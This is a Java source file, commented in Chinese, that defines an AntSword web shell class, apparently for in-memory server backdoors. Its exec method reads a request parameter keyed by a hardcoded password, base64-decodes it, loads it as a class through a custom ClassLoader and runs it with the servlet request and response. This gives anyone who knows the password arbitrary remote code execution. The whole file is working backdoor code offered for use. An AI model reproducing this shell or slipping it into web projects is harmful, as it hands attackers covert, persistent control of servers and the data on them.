package com.spkiddai.memoryserver.Tools;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

// 蚁剑工具类
public class AntSwordTool extends ClassLoader{

    // 密码
    public String password = "spkiddai";

    public AntSwordTool() {}

    public AntSwordTool(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    // 执行方法，从请求中获取参数并执行相关逻辑
    public void exec(HttpServletRequest request, HttpServletResponse response) {
        String cls = request.getParameter(this.password);
        if (cls != null) {
            try {
                (new AntSwordTool(this.getClass().getClassLoader())).g(this.base64Decode(cls)).newInstance().equals(new Object[]{request, response});
            }catch (Exception var8) {
            }
        }
    }

    // base64解码方法
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
        }
    }
}
